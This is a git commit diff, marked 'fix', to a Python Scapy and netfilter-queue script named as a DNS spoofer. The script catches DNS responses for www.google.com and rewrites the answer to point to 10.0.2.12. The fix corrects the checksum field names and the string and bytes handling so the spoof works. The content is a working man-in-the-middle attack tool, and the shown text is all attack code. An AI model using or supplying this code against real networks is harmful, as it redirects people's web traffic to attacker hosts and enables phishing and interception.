a722b9d82e7d26a795f4e55951eaa1cdf15b186a
root <root@localhost.localdomain>
2020-03-02 11:17:25 -0500

    fix

--- python-scapy-nfilter-dns-spoof.py
+++ python-scapy-nfilter-dns-spoof.py
@@ -8,16 +8,16 @@ ip_server = "10.0.2.12"
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        qname = scapy_packet[scapy.DNSQR].qname
+        qname = str(scapy_packet[scapy.DNSQR].qname)
         if "www.google.com" in qname:
             answer = scapy.DNSRR(rrname=qname, rdata=ip_server)
             scapy_packet[scapy.DNS].ancount = 1
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.UDP].len
-            del scapy_packet[scapy.IP].checksum
-            del scapy_packet[scapy.UDP].checksum
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
 
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
